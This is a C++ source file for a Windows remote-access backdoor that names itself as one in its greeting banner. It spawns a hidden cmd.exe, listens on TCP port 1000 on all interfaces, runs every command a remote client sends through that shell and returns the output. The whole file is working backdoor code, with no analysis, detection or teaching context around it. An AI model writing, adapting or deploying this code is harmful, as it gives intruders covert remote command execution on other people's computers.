//#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

#pragma comment (lib, "Ws2_32.lib")

#undef UNICODE

#define WIN32_LEAN_AND_MEAN
#define BUFSIZE 8000

#include <windows.h>
#include <winsock2.h>
#include <tchar.h>
#include <stdio.h> 
#include <strsafe.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <iostream>
#include <string>

using namespace std;
 
HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

HANDLE g_hInputFile = NULL;

PROCESS_INFORMATION piProcInfo; 
STARTUPINFO siStartInfo;
 
void CreateChildProcess(void); 
void WriteToPipe(CHAR[BUFSIZE]); 
CHAR* ReadFromPipe(void); 
void ErrorExit(PTSTR);
void setupServer(void);
string formatMessage(string);
void putinNetBuffer(string);
void cleanNetworkBuffer(void);
void putinPipeBuffer(string);
void cleanPipeBuffer(void);

WSADATA t_wsa; // WSADATA structure
WORD wVers; // version number
int iError; // error number

CHAR NetworkBuffer[BUFSIZE];
CHAR PipeBuffer[BUFSIZE];
bool ExitNow = false;

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
//int main() {

	SECURITY_ATTRIBUTES saAttr; 
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL;

	 if ( ! CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0) ) 
		ErrorExit(TEXT("StdoutRd CreatePipe")); 

// Ensure the read handle to the pipe for STDOUT is not inherited.
	 if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) )
		ErrorExit(TEXT("Stdout SetHandleInformation")); 

// Create a pipe for the child process's STDIN. 
   if (! CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) 
      ErrorExit(TEXT("Stdin CreatePipe")); 

// Ensure the write handle to the pipe for STDIN is not inherited. 
   if ( ! SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0) )
      ErrorExit(TEXT("Stdin SetHandleInformation")); 
 
// Create the child process.   
   CreateChildProcess();


  /* g_hInputFile = CreateFile(
       "donkey.txt", 
       GENERIC_READ, 
       0, 
       NULL, 
       OPEN_EXISTING, 
       FILE_ATTRIBUTE_READONLY, 
       NULL); 

   if ( g_hInputFile == INVALID_HANDLE_VALUE ) 
      ErrorExit(TEXT("CreateFile")); 
	  */


	//////////////////////
	//Winsock
	wVers = MAKEWORD(2, 2); // Set the version number to 2.2
    iError = WSAStartup(wVers, &t_wsa); // Start the WSADATA

	if(iError != NO_ERROR || iError == 1){
				MessageBox(NULL, (LPCTSTR)"Cant Start Winsock!", (LPCTSTR)"Server::Error", MB_OK|MB_ICONERROR);
                WSACleanup();
                return 0;
        }
	setupServer();
	while(!ExitNow) {
		putinPipeBuffer("cls \r\n\0");
		WriteToPipe(PipeBuffer);
		setupServer();
	}
	///////////////////


// Write to the pipe that is the standard input for a child process. 
// Data is written to the pipe's buffers, so it is not necessary to wait
// until the child process is running before writing data.
	/*Sleep(100);
	printf(ReadFromPipe());
	CHAR Com[BUFSIZE] = "netstat -a\n";
	WriteToPipe(Com); 
	Sleep(5000);
	printf(ReadFromPipe()); 
	Sleep(100);
	strcpy(Com,"dir\n");
	WriteToPipe(Com);
	Sleep(1000);
	printf(ReadFromPipe());
	Sleep(100);*/

// The remaining open handles are cleaned up when this process terminates. 
// To avoid resource leaks in a larger application, close handles explicitly. 


	/*STARTUPINFO si;
    PROCESS_INFORMATION pi;

	ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

	if(!CreateProcess("C:\\windows\\system32\\cmd.exe",NULL,NULL,NULL,FALSE,0x00000010,NULL,NULL,&si,&pi)) {
		return 0;
	}
	else {
		HANDLE pHandle = pi.hProcess;
	}

	WaitForSingleObject( pi.hProcess, INFINITE );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );*/
	CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
	WSACleanup();

	return 0;
}

void CreateChildProcess()
// Create a child process that uses the previously created pipes for STDIN and STDOUT.
{ 
   TCHAR szCmdline[]=TEXT("C:\\windows\\system32\\cmd.exe");
   BOOL bSuccess = FALSE; 
 
// Set up members of the PROCESS_INFORMATION structure. 
 
   ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );
 
// Set up members of the STARTUPINFO structure. 
// This structure specifies the STDIN and STDOUT handles for redirection.
 
   ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
   siStartInfo.cb = sizeof(STARTUPINFO); 
   siStartInfo.hStdError = g_hChildStd_OUT_Wr;
   siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
   siStartInfo.hStdInput = g_hChildStd_IN_Rd;


   siStartInfo.dwFlags = STARTF_USESHOWWINDOW;
   siStartInfo.wShowWindow = SW_HIDE;

   siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
 
// Create the child process. 
    
   bSuccess = CreateProcess(NULL, 
      szCmdline,     // command line 
      NULL,          // process security attributes 
      NULL,          // primary thread security attributes 
      TRUE,          // handles are inherited 
      0x00000010,             // creation flags 
      NULL,          // use parent's environment 
      NULL,          // use parent's current directory 
      &siStartInfo,  // STARTUPINFO pointer 
      &piProcInfo);  // receives PROCESS_INFORMATION 
   
   // If an error occurs, exit the application. 
   if ( ! bSuccess ) 
      ErrorExit(TEXT("CreateProcess"));
   else 
   {
      // Close handles to the child process and its primary thread.
      // Some applications might keep these handles to monitor the status
      // of the child process, for example. 
   }
}
 
void WriteToPipe(CHAR Command[BUFSIZE]) 

// Read from a file and write its contents to the pipe for the child's STDIN.
// Stop when there is no more data. 
{ 
   DWORD dwRead, dwWritten; 
   CHAR chBuf[BUFSIZE];
   BOOL bSuccess = FALSE;

   strcpy(chBuf,Command);
      //bSuccess = ReadFile(g_hInputFile, chBuf, BUFSIZE, &dwRead, NULL);
      //if ( ! bSuccess || dwRead == 0 ) break;    
   bSuccess = WriteFile(g_hChildStd_IN_Wr, chBuf, strlen(chBuf), &dwWritten, NULL); 
 
// Close the pipe handle so the child process stops reading.
 
   //if ( ! CloseHandle(g_hChildStd_IN_Wr) ) 
     // ErrorExit(TEXT("StdInWr CloseHandle")); 
} 
 
CHAR* ReadFromPipe()

// Read output from the child process's pipe for STDOUT
// and write to the parent process's pipe for STDOUT. 
// Stop when there is no more data. 
{ 
   DWORD dwRead, dwWritten; 
   CHAR chBuf[BUFSIZE]; 
   BOOL bSuccess = TRUE;
   HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

// Close the write end of the pipe before reading from the 
// read end of the pipe, to control child process execution.
// The pipe is assumed to have enough buffer space to hold the
// data the child process has already written to it.
 
   //if (!CloseHandle(g_hChildStd_OUT_Wr)) 
   //   ErrorExit(TEXT("StdOutWr CloseHandle")); 
	memset(chBuf,0,BUFSIZE);
	bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
	return(chBuf);
} 
 
void ErrorExit(PTSTR lpszFunction) 

// Format a readable error message, display a message box, 
// and exit from the application.
{ 
    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError(); 

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR) &lpMsgBuf,
        0, NULL );

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT, 
        (lstrlen((LPCTSTR)lpMsgBuf)+lstrlen((LPCTSTR)lpszFunction)+40)*sizeof(TCHAR)); 
    StringCchPrintf((LPTSTR)lpDisplayBuf, 
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("%s failed with error %d: %s"), 
        lpszFunction, dw, lpMsgBuf); 
    MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK); 

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
    ExitProcess(1);
}
void setupServer() {
	SOCKET sServer;
        sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sServer == INVALID_SOCKET || iError == 1) {
				MessageBox(NULL, (LPCTSTR)"Socket Error!", (LPCTSTR)"Server::Error", MB_OK|MB_ICONERROR);
                WSACleanup();
                return;
        }

		SOCKADDR_IN sinServer;
        memset(&sinServer, 0, sizeof(sinServer));

        sinServer.sin_family = AF_INET;
        sinServer.sin_addr.s_addr = INADDR_ANY; // Where to start server?
        sinServer.sin_port = htons(1000); // Port

		if(bind(sServer, (LPSOCKADDR)&sinServer, sizeof(sinServer)) == SOCKET_ERROR){
                /* failed at starting server */
                WSACleanup();
				MessageBox(NULL, (LPCTSTR)"Failed Starting Srever!", (LPCTSTR)"Server::Error", MB_OK|MB_ICONERROR);
                return;
        }

		while(listen(sServer, 1) == SOCKET_ERROR){
			Sleep(10);
		}

		SOCKET sClient;
        int szlength;

        szlength = sizeof(sinServer);
        sClient = accept(sServer, (LPSOCKADDR)&sinServer, &szlength);

		if (sClient == INVALID_SOCKET){
                MessageBox(NULL, (LPCTSTR)"Could not accept this client!", (LPCTSTR)"Server::Error", MB_OK|MB_ICONERROR);
				closesocket(sServer);
                WSACleanup();
                return;
        } else {
			//MessageBox(NULL, (LPCTSTR)"Accepted a Client!", (LPCTSTR)"Server::Success", MB_OK);
		}

		string initialRead = ReadFromPipe();

		int iRet;
        char buffer[BUFSIZE];
        strcpy(buffer, "<----- Welcome to My Backdoor ------>\r\n\r\n\0");
        iRet = send(sClient, buffer, strlen(buffer), 0);
        if(iRet == SOCKET_ERROR){
                MessageBox(NULL, (LPCTSTR)"Could not send data!", (LPCTSTR)"Server::Error", MB_OK|MB_ICONERROR);
                closesocket(sClient);
				closesocket(sServer);
                WSACleanup();
                return;
        }
	//-----------------------------------------------------------------------------------
	//Put in loop to send recieve commands!!!
	//char autoresponse[5999];
    int bytes;
	//strcpy(autoresponse,formatMessage(initialRead));
    //autoresponse[strlen(autoresponse)-1] = 0;
	putinNetBuffer(initialRead);
	iRet = send(sClient, NetworkBuffer, strlen(NetworkBuffer), 0);
    //MessageBox(NULL, (LPCTSTR)"Server is ready for messages and is hiding!", (LPCTSTR)"Server::Success", MB_OK);
    //char *cClientMessage;
    string cClientMessage = "";
    //cClientMessage[5999] = 0;
	cleanNetworkBuffer();

	while(bytes = recv(sClient, NetworkBuffer, BUFSIZE, 0)){
    if(bytes <= 2){
      Sleep(300);
      continue;
    }			
				cClientMessage = NetworkBuffer;
				//WriteToPipe(cClientMessage);
				if (cClientMessage == "byebye") {
					ExitNow = true;
					closesocket(sClient);
					closesocket(sServer);
					return;
				}
				string thold = formatMessage(cClientMessage);
				putinPipeBuffer(thold);
				WriteToPipe(PipeBuffer);
				//WriteToPipe("hello\n");
				Sleep(500);
                //MessageBox(NULL, (LPCTSTR)cClientMessage, (LPCTSTR)"Server::Message Received", MB_OK|MB_ICONEXCLAMATION);
				cleanPipeBuffer();
				string pipeResp = ReadFromPipe();
				putinNetBuffer(pipeResp);
				//strcpy(autoresponse,ReadFromPipe());
                iRet = send(sClient, NetworkBuffer, strlen(NetworkBuffer), 0);
                if(iRet == SOCKET_ERROR){
                        MessageBox(NULL, (LPCTSTR)"Could not send response!", (LPCTSTR)"Server::Error", MB_OK|MB_ICONERROR);
                        closesocket(sClient);
						closesocket(sServer);
                        WSACleanup();
                        return;
                }
                //delete [] cClientMessage;
                //cClientMessage = new char[6000];
				//cClientMessage[5999] = 0;
				cleanNetworkBuffer();
				cleanPipeBuffer();
                Sleep(100); // Don't consume too much CPU power.
        }
	//------------------------------------------------------------------------------------
		closesocket(sClient);
        closesocket(sServer);
        // Shutdown Winsock
}
string formatMessage(string iMessage) {
	string temp = iMessage;
	string temp2 = "";
	int count = 0;
	for (int loop = 0;loop < temp.length();loop++) {
		char donkey = temp[loop];
		int cval = donkey;
		if (cval > 0) {
			temp2 = temp2 + donkey;
			count++;
		}
	}
	string final = "";

	for (int loop = 0;loop < temp.length();loop++) {
		char donkey = temp[loop];
		int cval = donkey;
		if (cval > 0) {
			final = final + donkey;
		}
	}
	final = final +"\r\n\0";
	
	return final;
}
void putinNetBuffer(string vp) {
	memset(NetworkBuffer,0,BUFSIZE);
	for (int loop = 0;loop < vp.length();loop++) {
		NetworkBuffer[loop] = vp[loop];
	}
}
void cleanNetworkBuffer() {
	memset(NetworkBuffer,0,BUFSIZE);
}
void putinPipeBuffer(string val) {
	memset(PipeBuffer,0,BUFSIZE);
	for (int loop = 0;loop < val.length();loop++) {
		PipeBuffer[loop] = val[loop];
	}
}
void cleanPipeBuffer() {
	memset(PipeBuffer,0,BUFSIZE);
}